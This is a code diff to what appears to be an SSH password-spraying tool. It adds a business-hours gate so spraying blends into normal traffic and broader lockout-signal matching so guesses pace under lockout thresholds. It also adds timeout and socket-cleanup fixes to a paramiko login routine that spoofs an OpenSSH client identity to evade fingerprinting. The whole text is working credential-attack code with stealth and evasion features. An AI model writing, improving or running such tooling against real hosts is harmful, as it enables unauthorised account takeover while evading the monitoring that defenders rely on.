@@ -130,11 +130,17 @@ async def _spray_host(
 
     # Business-hours gate: outside the window, hold here rather than emit noise.
     if plan.business_hours:
-        # bounded wait so we don't block the whole run forever off-hours
+        # Bounded wait so we don't block the whole run forever off-hours.
         for _ in range(60):
             if within_business_hours():
                 break
             await asyncio.sleep(30)
+        # If the window never opened after the bounded wait, skip this host
+        # rather than spraying off-hours (the whole point of the gate).
+        if not within_business_hours():
+            res.skipped = True
+            res.skip_reason = "off-business-hours after bounded wait"
+            return res
 
     # Auth-method precheck: skip publickey-only / unreachable hosts entirely.
     if plan.skip_publickey_only:
@@ -194,10 +200,17 @@ async def _spray_host(
                 pass
 
         # Lockout-aware cadence: a base delay + jitter between guesses, and an
-        # extra lockout_delay when the last error looked like a lockout/ban so
-        # we back off instead of hammering a tripped threshold.
-        lockout_hit = attempt.error and (
-            "lockout" in attempt.error.lower() or "denied" in attempt.error.lower()
+        # extra lockout_delay when the last error looked like a genuine
+        # lockout/ban so we back off instead of hammering a tripped threshold.
+        # Note: a plain "Permission denied" is the *normal* wrong-password
+        # rejection, not a lockout, so we must not match on "denied" -- that
+        # would apply the lockout delay after every failed guess and collapse
+        # the per-attempt delay vs lockout_delay distinction.
+        _err_lower = (attempt.error or "").lower()
+        lockout_hit = any(
+            sig in _err_lower
+            for sig in ("lockout", "locked", "too many", "max attempts",
+                        "rate limit", "throttl", "blocked", "banned")
         )
         base = plan.lockout_delay if lockout_hit else plan.delay
         await asyncio.to_thread(
@@ -214,6 +227,8 @@ async def _paramiko_attempt(
     """paramiko fallback login (distinct HASSH -- residual risk noted)."""
     attempt = LoginAttempt(user=user, password=password, backend="paramiko",
                            source=proxy or jump)
+    sock = None
+    t = None
     try:
         import paramiko  # type: ignore[import-not-found]
         import socket as _socket
@@ -222,6 +237,9 @@ async def _paramiko_attempt(
         sock = _socket.create_connection((ip, port), timeout=timeout_s)
         sock.settimeout(timeout_s)
         t = paramiko.Transport(sock)
+        # Bound blocking transport reads (incl. auth_password) so a hung
+        # server stalls only this attempt, not the whole event loop slot.
+        t.set_timeout(timeout_s)
         try:
             t._CLIENT_IDENTITY = "SSH-2.0-OpenSSH_9.0p1 Debian-1"
         except Exception:
@@ -231,12 +249,21 @@ async def _paramiko_attempt(
         t.auth_password(user, password)
         attempt.success = True
         attempt.error = PARAMIKO_HASSH_RISK
-        try:
-            t.close()
-        except Exception:
-            pass
     except Exception as exc:
         attempt.error = f"{type(exc).__name__}: {exc}"
+    finally:
+        # t.close() closes the underlying socket too; only close sock
+        # directly when Transport construction failed before t was bound.
+        if t is not None:
+            try:
+                t.close()
+            except Exception:
+                pass
+        elif sock is not None:
+            try:
+                sock.close()
+            except Exception:
+                pass
     return attempt
 
 
